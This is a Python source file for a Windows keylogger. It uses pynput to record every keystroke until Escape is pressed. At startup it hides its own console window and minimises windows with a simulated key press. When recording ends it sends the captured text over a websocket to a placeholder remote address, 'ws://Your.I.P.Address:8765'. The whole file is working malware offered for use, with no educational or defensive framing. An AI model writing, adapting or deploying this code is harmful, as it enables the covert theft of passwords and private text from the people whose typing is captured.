from pynput import keyboard
from pynput.keyboard import Key, Controller
import asyncio
import websockets
import ctypes

message = ""

def on_press(key):
    global message
    try:
        message = message + key.char
    except AttributeError:
        if key == keyboard.Key.enter or key == keyboard.Key.tab:
            message += "\n"
            
        elif key == keyboard.Key.backspace:
            message = message[:-1]
        elif key == keyboard.Key.shift or key == keyboard.Key.esc:
            return
        elif key == keyboard.Key.space:
            message += " "
        else:
            message += " " + str(key) + " "

def on_release(key):
    global message
    if key == keyboard.Key.esc:
        message = message + "\n END OF TRANSMISION \n"
        # Stop listener
        return False

async def client_handler(message, websocket):
    try:
        await websocket.send(message)
    except:
        return

async def main():
    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
    
    uri = "ws://Your.I.P.Address:8765"
    async with websockets.connect(uri) as websocket:
        await client_handler(message, websocket)
    


if __name__ == "__main__":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)
    keyboard_control = Controller()
    with keyboard_control.pressed(Key.cmd_l):
        keyboard_control.press(Key.down)
        keyboard_control.release(Key.down)
    asyncio.run(main())
    


